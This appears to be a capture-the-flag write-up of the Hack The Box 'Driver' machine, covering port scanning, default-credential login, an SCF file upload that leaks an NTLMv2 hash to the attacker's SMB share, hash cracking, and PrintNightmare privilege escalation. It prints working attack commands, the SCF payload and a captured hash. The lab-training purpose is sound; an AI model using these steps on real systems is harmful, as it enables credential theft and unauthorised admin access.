### Overview

[Driver](https://app.hackthebox.com/machines/Driver) is a easy box from [Hack The Box](https://hackthebox.com), demonstrating the impact of the Windows PrintNightmare vulnerability and also I learnt about SCF files. This was a new attack vector for me.

### Nmap

I deployed the machine and was given the target IP 10.10.11.106. I started a NMAP scan to check the available ports. 

```shell
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:20 GMT

```

3 Ports open:

- 80 - HTTP - Microsoft IIS httpd 10.0
- 135 - MSRPC - Microsoft Windows RPC
- 445 - SMB - Microsoft Windows 7 - 10 microsoft-ds

I also ran a full port scan and found winrm to be open on port 5985.

```shell
└──╼ $sudo nmap -p- -oA nmap/all_ports 10.10.11.106
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-27 17:25 GMT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
5985/tcp open  wsman
```

The web service is showing an unauthorized response however it could be leaking a username with the message "Please enter password for admin". 

### Enumeration

Before looking at the web service I tried enumerating SMB with various tools such as smbmap, smbclient and CrackMapExec however I had no joy.

```shell
└──╼ $cme smb 10.10.11.106
SMB         10.10.11.106    445    DRIVER           [*] Windows 10 Enterprise 10240 x64 (name:DRIVER) (domain:DRIVER) (signing:False) (SMBv1:True)
┌─[daz@parrotos]─[~/Documents/HackTheBox/Driver]
└──╼ $smbmap -H 10.10.11.106
[!] Authentication error on 10.10.11.106
```

So I turned my attention to the web service. Navigating to the IP I did get a login prompt. I tried admin:admin and got in!

![login](/assets/images/driver/login.png)

Once logged in, I get a simple web page but an email address of 'support@driver.htb'. I updated my host file with 'driver.htb' just in case I need it later.

![homepage](/assets/images/driver/homepage.png)

The only link that works on the web page is 'Firmware Updates'. This page provides an upload function. I played around with this for such a long time, trying attacks like XSS, uploading PHP shells but nothing worked. 

![upload](/assets/images/driver/upload.png)

However re-reading the line:

> Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon. 

I decided to change my google search to "http smb file share exploit" and found an article on using SCF files.

### Initial Access

The first article that returned was from Penetration testing lab https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/. After reading the article I created the file test.scf using the example they provide and changed the IP to my VPN IP.

```shell
└──╼ $cat test.scf 
[Shell]
Command=2
IconFile=\\10.10.14.11\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

I started responder with the command '```sudo responder -I tun0```'.

Then uploaded the file using the web upload function and got a hit from responder

```shell
[SMB] NTLMv2-SSP Client   : 10.10.11.106
[SMB] NTLMv2-SSP Username : DRIVER\tony
[SMB] NTLMv2-SSP Hash     : tony::DRIVER:87ea6d299d14fa32:ED6355EFB0444E974805B3FF0E0B9B26:0101000000000000803021AB042CD801AE67B0D5B0D050060000000002000800350054003400480001001E00570049004E002D0

30041004C000500140035005400340048002E004C004F00430041004C0007000800803021AB042CD80106000400020000000800300030000000000000000000000000200000C974CDC12A32C5BFD81B375A1DECF3BF2FF300E27CB3440A6AC953C
7F84AACEA0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003100000000000000000000000000
```

I put the hash in to a file called 'hash' and used hashcat to crack it with the command ```hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt```.

Now I had a username and password I was able to use winrm to login. To login I used [Evil-WinRM](https://github.com/Hackplayers/evil-winrm).

```shell
└──╼ $/opt/evil-winrm/evil-winrm.rb -u tony -i 10.10.11.106
Enter Password: 

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\tony\Documents> 
```

### Priv Esc

Now I had a foothold, I did some basic enumeration of the box. Looking at the running services I could see the Windows print spooler service. 

```shell
    381      23     5164      14448 ...12            1128 spoolsv
```

This made me think of the PrintNightmare exploit. I could also have used rpcdump to find this.

```shell
└──╼ $rpcdump.py 10.10.11.106 | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

To exploit this I used the [exploit](https://github.com/calebstewart/CVE-2021-1675) created by [Caleb Stewart](https://twitter.com/calebjstewart) and [John Hammond](https://twitter.com/_JohnHammond).

I used git to clone the repo in to my /opt directory.

```shell
└──╼ $sudo git clone https://github.com/calebstewart/CVE-2021-1675.git
Cloning into 'CVE-2021-1675'...

┌─[daz@parrotos]─[/opt/CVE-2021-1675]
└──╼ $ls
CVE-2021-1675.ps1  nightmare-dll  README.md
```

Now using Evil-WinRM I can upload the powershell script and execute it.

```shell
*Evil-WinRM* PS C:\Users\tony\Documents> upload /opt/CVE-2021-1675/CVE-2021-1675.ps1
Info: Uploading /opt/CVE-2021-1675/CVE-2021-1675.ps1 to C:\Users\tony\Documents\CVE-2021-1675.ps1

                                                             
Data: 238080 bytes of 238080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\tony\Documents> Import-Module C:\Users\tony\Documents\CVE-2021-1675.ps1
*Evil-WinRM* PS C:\Users\tony\Documents> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\tony\AppData\Local\Temp\nightmare.dll

[+] added user  as local administrator
[+] deleting payload from C:\Users\tony\AppData\Local\Temp\nightmare.dll
```

It worked! I canceled my current WinRM session and logged back in using the new credentials.

```shell
*Evil-WinRM* PS C:\Users\tony\Documents> exit

Info: Exiting with code 0

Thats the box, thanks for reading!
